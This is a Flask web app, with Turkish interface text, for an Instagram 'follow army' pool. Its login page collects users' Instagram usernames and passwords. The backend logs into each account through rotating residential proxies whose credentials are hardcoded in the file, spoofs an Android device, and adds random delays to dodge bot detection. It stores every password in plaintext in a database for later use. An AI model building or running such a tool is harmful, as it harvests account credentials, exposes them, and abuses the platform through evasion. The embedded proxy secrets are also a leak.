import os
import random
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_army_v5.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 🚀 50 ADET STICKY RESIDENTIAL PROXY CEPHANESİ
PROXY_POOL = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84639863:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68182545:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-51767287:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68467738:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-96271173:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-74157191:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-58918651:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68678841:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-46429632:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-17426981:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-21779381:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-14741598:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-15883827:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-16665927:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-77458619:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-71571623:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-54294376:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-78592329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-31866599:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-45714658:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-91245644:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-51887393:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-46967593:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-57524117:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-19727293:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-15366548:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-74662724:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-48619742:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-97373613:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-61915911:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-19745234:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-87154694:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-54643851:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-25397281:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73268429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-59755624:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-49617699:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-52943223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68562329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-62198538:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-42773365:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73343122:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-49537566:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84759223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-13543997:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84282544:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-57134195:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
]

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>All Follow | V5.0 Army</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200 font-sans">
        <div class="bg-[#161b2c] p-8 rounded-[2.5rem] w-full max-w-[380px] border border-slate-800 shadow-2xl text-center">
            <h1 class="text-3xl font-black text-blue-500 italic mb-1">ALL FOLLOW</h1>
            <p class="text-[9px] text-emerald-500 tracking-[0.4em] mb-8 font-bold uppercase">50x Multi-Proxy Army Active</p>
            
            <div id="login-box" class="space-y-4">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:ring-2 focus:ring-blue-600 transition-all text-sm">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:ring-2 focus:ring-blue-600 transition-all text-sm">
                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 shadow-lg active:scale-95 transition-all text-sm tracking-widest">HAVUZA KATIL</button>
            </div>
            
            <p id="msg" class="text-[10px] mt-8 font-semibold text-slate-500 uppercase leading-relaxed tracking-tight"></p>
        </div>

        <script>
            async function login() {
                const u=document.getElementById('u').value.trim().toLowerCase(), p=document.getElementById('p').value;
                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
                if(!u || !p) return;
                
                btn.disabled = true; btn.innerText = "IP SEÇİLİYOR...";
                msg.innerText = "Güvenli tünel üzerinden bağlanılıyor...";
                
                try {
                    const r = await fetch('/api/login', {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({u, p})
                    });
                    const d = await r.json();
                    msg.innerText = d.msg;
                    if(d.status === "success") {
                        btn.style.background = "#10b981"; btn.innerText = "BAĞLANDI ✅";
                    } else {
                        btn.disabled = false; btn.innerText = "YENİDEN DENE";
                    }
                } catch(e) { msg.innerText = "Bağlantı hatası!"; btn.disabled = false; }
            }
        </script>
    </body>
    </html>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    cl = Client()
    # 🎲 RASTGELE PROXY SEÇİMİ
    selected_proxy = random.choice(PROXY_POOL)
    cl.set_proxy(selected_proxy)
    
    # 📱 CİHAZ SİMÜLASYONU
    cl.set_device_settings({
        "app_version": "269.0.0.18.75",
        "android_version": 29,
        "android_release": "10.0",
        "dpi": "480dpi",
        "resolution": "1080x1920",
        "manufacturer": "Samsung",
        "model": "SM-G973F",
        "device": "beyond1",
        "cpu": "exynos9820",
        "version_code": "442436154"
    })
    
    cl.request_timeout = 60

    try:
        # İnsansı hız simülasyonu
        time.sleep(random.uniform(1.5, 4.0))
        
        cl.login(u, p)
        
        # Veritabanı Kaydı
        user_record = PoolUser.query.filter_by(username=u).first()
        if not user_record:
            user_record = PoolUser(username=u, password=p)
            db.session.add(user_record)
        user_record.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Sisteme sızıldı! Hesabın havuzda.")

    except Exception as e:
        err = str(e).lower()
        if "challenge" in err or "checkpoint" in err:
            return jsonify(status="error", msg="Onay gerekli. Uygulamadan onay verin.")
        
        # Instagram "bulunamadı" diyerek yanıltmaya çalışıyorsa
        if "find an account" in err:
            return jsonify(status="error", msg="Erişim reddedildi. Tekrar deneyin (Yeni IP atanacak).")

        return jsonify(status="error", msg=f"Reddedildi: {err[:40]}")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
